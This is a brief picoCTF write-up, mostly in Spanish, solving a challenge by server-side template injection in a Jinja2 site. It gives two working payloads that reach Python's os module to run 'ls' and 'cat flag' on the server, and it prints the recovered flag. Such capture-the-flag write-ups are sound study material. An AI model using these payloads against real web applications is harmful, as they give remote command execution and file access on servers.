## Objetivo
I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:61622/)!
## Solución
```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}

{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}



picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
```
## Notas Adicionales
Al parecer existe una vulnerabilidad llamada ssti donde puedes correr codigo directamente del lado del servidor y usando uno de los ejemplo que encontre en la pagina pude usar ls para ver los archivos y posteriormente le hice cat a la flag.
### Referencias
https://onsecurity.io/article/server-side-template-injection-with-jinja2/